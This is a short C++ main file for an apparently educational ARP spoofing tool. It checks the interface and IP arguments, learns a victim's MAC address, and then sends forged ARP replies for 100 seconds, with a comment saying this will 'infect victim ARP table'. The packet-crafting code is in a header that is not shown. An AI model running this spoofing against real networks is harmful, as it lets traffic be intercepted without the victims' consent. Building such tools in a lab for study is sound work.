#include <iostream>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <thread>
#include "info_network.hpp"
using namespace std;

int main(int argc, char *argv[], char *envp[])
{
    // start verification // check also interface and ip addr
    // Constructor
    arp_packet arp(argv[1], argv[2], argv[3]);
    if(argc != 4)
        arp.check_argc();
    else{
        arp.check_interface(argv[1]);   
        arp.check_ipaddr(argv[2], argv[3]);
    }
    // end verification

    // get victim's MAC Address
    thread t1 = arp.arp_request();
    thread t2 = arp.arp_capture();
    
    // info.print_status();
    arp.print_status();
    
    // infect victim ARP table
    for(int i = 0; i < 100; i++){
        sleep(1);
        arp.arp_reply();
    }

    return 0;
}
